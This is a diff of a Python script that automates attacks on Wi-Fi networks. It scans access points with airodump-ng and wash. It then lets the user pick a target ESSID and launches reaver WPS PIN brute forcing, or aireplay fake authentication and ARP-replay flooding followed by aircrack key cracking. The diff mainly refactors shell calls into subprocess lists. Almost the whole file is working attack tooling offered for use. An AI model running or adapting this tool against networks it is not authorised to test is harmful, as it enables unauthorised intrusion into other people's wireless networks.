@@ -12,22 +12,19 @@
 # - Currently only working attacks involve reaver and wash
 #
 
-# Imports
 from re import sub
 from sys import argv
 from time import sleep
 from getopt import getopt
 from subprocess import PIPE, Popen
-from os import remove, path, system, popen
+from os import remove, path
 
-# Globals
 debug = 0
 showscan = 0
 washtime = 0
 scantime = 0
 iface = 'wlan0'
 
-# Statics
 DUMP_BSSID = 0
 DUMP_ESSID = 13
 DUMP_CHANNEL = 3
@@ -46,15 +43,13 @@ REAVER = '/usr/bin/reaver'
 IFCONFIG = '/usr/bin/ifconfig'
 IWCONFIG = '/usr/bin/iwconfig'
 DATE = '/usr/bin/date'
-KILLALL = '/usr/bin/killall -w'
+KILLALL = '/usr/bin/killall -w -s SIGINT'
 
-# Debug printer
 def dprint(data='', iforce=0):
 	global debug
 	if ((iforce==1) or (debug==1)):
 		print(data)
 
-# String padder
 def pad(data='', ilength=0):
 	if (len(data) == ilength):
 		return data
@@ -63,8 +58,7 @@ def pad(data='', ilength=0):
 	else:
 		diff = ilength - len(data)
 		return data + (' ' * diff)
-		
-# Option parser		
+
 def parseopts():
 	global debug
 	global iface
@@ -84,10 +78,10 @@ def parseopts():
 			scantime = int(arg)
 		elif opt in ('-r'):
 			washtime = int(arg)
-			
+
 def dosep():
 	dprint('-' * 90, 1)
-	
+
 def showtable(thekeys, thetable):
 	apcount = 0
 	for ap in thetable:
@@ -103,11 +97,9 @@ def showtable(thekeys, thetable):
 				padamt = 3
 			pstr += wkey + ': ' + pad(ap[wkey], padamt)  + ' '
 		dprint(pstr, 1)
-		
-# Main loop		
+
+# Main loop
 def runmain():
-		
-	# Init
 	global iface
 	global scantime
 	global washtime
@@ -135,51 +127,32 @@ def runmain():
 	if ((scantime < 1) and (washtime < 1)):
 		dprint('Please select at least one scan mode!', 1)
 		return 1
-	thenow = popen(DATE).read()
-	dprint(argv[0] + ' started on ' + thenow.strip())
-	dprint('Setting wireless card ' + iface + ' to monitor mode')
-	system(IFCONFIG + ' ' + iface + ' down')
-	system(IWCONFIG + ' ' + iface + ' mode monitor')
-	system(IFCONFIG + ' ' + iface + ' up')
+	dprint('Setting wireless card ' + iface + ' to monitor mode.')
+	a = Popen([IFCONFIG, iface, 'down'])
+	a.wait()
+	b = Popen([IWCONFIG, iface, 'mode', 'monitor'])
+	b.wait()
+	c = Popen([IFCONFIG, iface, 'up'])
+	c.wait()
 	dprint('Scanning for ' + repr(scantime + washtime) + ' seconds...', 1)
-	
-	# Scan airodump-ng
 	if (scantime > 0):
 		if (path.exists('quickscan-01.csv')):
 			remove(r'quickscan-01.csv')
 		dprint('Starting ' + AIRODUMP)
-		if (showscan != 1):
-			Popen(AIRODUMP + ' --write quickscan --output-format csv ' + iface, shell=True, stderr=PIPE, stdout=PIPE, stdin=PIPE)
-		else:
-			popen(AIRODUMP + ' --write quickscan --output-format csv ' + iface)
-		
-		# Sleep airodump-ng
-		dprint('airodump-ng scanning for ' + repr(scantime) + ' seconds...')
+		d = Popen([AIRODUMP, '--write', 'quickscan', '--output-format', 'csv', iface], shell=True, stderr=PIPE, stdout=PIPE, stdin=PIPE)
+		dprint(AIRODUMP + ' scanning for ' + repr(scantime) + ' seconds...')
 		sleep(scantime)
-
-		# Kill airodump-ng
 		dprint('Terminating ' + AIRODUMP)
-		popen(KILLALL + ' airodump-ng')
-
-	# Scan wash
+		d.kill()
 	if (washtime > 0):
 		if (path.exists('quickscan.wash')):
-			remove(r'quickscan.wash')		
+			remove(r'quickscan.wash')
 		dprint('Starting ' + WASH)
-		if (showscan != 1):
-			Popen(WASH + ' -C -o quickscan.wash -i ' + iface, shell=True, stderr=PIPE, stdout=PIPE)
-		else:
-			popen(WASH + ' -C -o quickscan.wash -i ' + iface)
-
-		# Sleep wash
-		dprint('wash scanning for ' + repr(washtime) + ' seconds...')
+		d = Popen([WASH, '-C', '-o', 'quickscan.wash', '-i', iface], shell=True, stderr=PIPE, stdout=PIPE)
+		dprint(WASH + ' scanning for ' + repr(washtime) + ' seconds...')
 		sleep(washtime)
-
-		# Kill wash
 		dprint('Terminating ' + WASH)
-		popen(KILLALL + ' wash')
-	
-	# Read airodump
+		d.kill()
 	dprint('Reading scan file(s)...')
 	if (scantime > 0):
 		aptable = [ ]
@@ -194,64 +167,53 @@ def runmain():
 				aptable.append(thisap)
 			else:
 				found = True
-	
-	# Read wash
 	if (washtime > 0):
 		washtable = [ ]
 		washrows = open('quickscan.wash').readlines()[0:]
-		washnames = sub(' +', ' ', washrows[0]).replace('WPS ', 'WPS-').replace('\n', '').split(' ')			
+		washnames = sub(' +', ' ', washrows[0]).replace('WPS ', 'WPS-').replace('\n', '').split(' ')
 		for wash in washrows[2:]:
 			if (wash.replace('\n', '') != ''):
 				cleanid = sub(' +', ' ', wash.replace('\n', '')).split(' ')
 				thisap = dict(zip(washnames, cleanid))
 				washtable.append(thisap)
-			
-	# Show airodump-ng	
 	if (scantime > 0):
 		dosep()
-		dprint('airodump-ng results:', 1)
+		dprint(AIRODUMP + ' results:', 1)
 		keykeys = [colnames[DUMP_BSSID], colnames[DUMP_ESSID], colnames[DUMP_CHANNEL], colnames[DUMP_PRIVACY], colnames[DUMP_POWER]]
 		showtable(keykeys, aptable)
-
-	# Show wash
 	if (washtime > 0):
 		dosep()
-		dprint('wash results:', 1)
+		dprint(WASH + ' results:', 1)
 		keykeys = [washnames[WASH_BSSID], washnames[WASH_ESSID], washnames[WASH_CHANNEL], washnames[WASH_LOCKED], washnames[WASH_POWER]]
 		showtable(keykeys, washtable)
-		
 	dosep()
-		
-	# Get attack option
 	atkopts = [ ]
 	if (scantime > 0):
 		atkopts.append('wep')
 		atkopts.append('wpa')
 	if (washtime > 0) or ():
-		atkopts.append('wps')	
+		atkopts.append('wps')
 	atkmode = ''
 	if (len(atkopts) == 1):
 			dprint('Auto-selecting WPS attack vector', 1)
-			atkmode = 'wps'	
+			atkmode = 'wps'
 	while (atkmode == ''):
 		avector = input('Please select an attack vector ' + repr(atkopts) + ': ').replace('\n', '').strip()
 		for mode in atkopts:
 			if (avector == mode):
 				atkmode = avector
-		if (atkmode == ''): 
-			dprint('Invalid attack vector chosen: ' + avector, 1)	
+		if (atkmode == ''):
+			dprint('Invalid attack vector chosen: ' + avector, 1)
 	dprint('Selected attack vector: ' + atkmode)
 	if (atkmode == 'wps'):
 		who2reav = input('Please enter the ESSID to attack: ').replace('\n', '').strip()
 		for ap in washtable:
 			if (ap[washnames[WASH_ESSID]] == who2reav):
 				dprint('Setting wireless channel to ' + ap[washnames[WASH_CHANNEL]])
-				thecmd = IWCONFIG + ' ' + iface + ' channel ' + ap[washnames[WASH_CHANNEL]]
-				popen(thecmd)
-				thecmd = REAVER + ' -i ' + iface + ' -b ' + ap[washnames[WASH_BSSID]] + ' -c ' + ap[washnames[WASH_CHANNEL]] + ' -vv'
-				dprint('Launching ' + REAVER + ', good luck!', 1)
-				dprint('Executing: ' + thecmd)
-				thereaver = Popen(thecmd, shell=True)
+				x = Popen([IWCONFIG, iface, 'channel', ap[washnames[WASH_CHANNEL]]])
+				x.wait()
+				dprint('Launching ' + REAVER + ', GLHF!', 1)
+				thereaver = Popen([REAVER, '-i', iface, '-b', ap[washnames[WASH_BSSID]], '-c', ap[washnames[WASH_CHANNEL]], '-vv'], shell=True)
 				thereaver.wait()
 				return 0
 		dprint('Invalid ESSID selected, you MUST type this correctly. Aborting...', 1)
@@ -268,21 +230,27 @@ def runmain():
 		who2crak = input('Please enter the ESSID to attack: ').replace('\n', '').strip()
 		for ap in aptable:
 			if (ap[colnames[DUMP_ESSID]] == who2crak):
-#				dprint('Not Implemented yet sorry', 1)
-#				return 0
-				system(IWCONFIG + ' ' + iface + 'channel ' + ap[colnames[DUMP_CHANNEL]])
-				popen(AIRODUMP + ' --write crackscan ' + iface + '--bssid ' + ap[colnames[DUMP_BSSID]] + ' --channel ' + ap[colnames[DUMP_CHANNEL]]) 
-				system(AIREPLAY + ' --fakeauth 0 -a ' + ap[colnames[DUMP_BSSID]] + ' ' + iface)
-				popen(AIREPLAY + ' --arpreplay ' + iface + ' -b ' + ap[colnames[DUMP_BSSID]])
+				dprint('Changing to channel ' + ap[colnames[DUMP_CHANNEL]])
+				h = Popen([IWCONFIG, iface, 'channel', ap[colnames[DUMP_CHANNEL]]])
+				h.wait()
+				dprint('Staring listener...')
+				i = Popen([AIRODUMP, '--write', 'crackscan', iface, '--bssid', ap[colnames[DUMP_BSSID]], '--channel', ap[colnames[DUMP_CHANNEL]]])
+				dprint('Associating with the AP...')
+				j = Popen([AIREPLAY, '--fakeauth', '0', '-a', ap[colnames[DUMP_BSSID]], iface])
+				dprint('Spamming AP with ARP packets...')
+				k = Popen([AIREPLAY, '--arpreplay', iface, '-b', ap[colnames[DUMP_BSSID]]])
+				dprint('Waiting 10 seconds...')
 				sleep(10)
-				Popen(AIRCRACK + ' crackscan.cap', shell=True, stderr=PIPE, stdout=PIPE, stdin=PIPE)
-				dummything = input('Press [ENTER] to continue...')
-				system(KILLALL + ' ' + AIREPLAY)
-				system(KILLALL + ' ' + AIRODUMP)
-				system(KILLALL + ' ' + AIRCRACK)
+				dprint('Launching ' + AIRCRACK + ', GLHF!')
+				l = Popen([AIRCRACK, 'crackscan.cap'], shell=True, stderr=PIPE, stdout=PIPE, stdin=PIPE)
+				l.wait()
+				dprint('Killing ' + AIREPLAY)
+				j.kill()
+				dprint('Killing ' + AIRODUMP)
+				i.kill()
 				return 0;
 		dprint('Invalid ESSID selected, you MUST type this correctly. Aborting...', 1)
-		return 1						
+		return 1
 
 # Do-it-to-it
 if (__name__ == '__main__'):
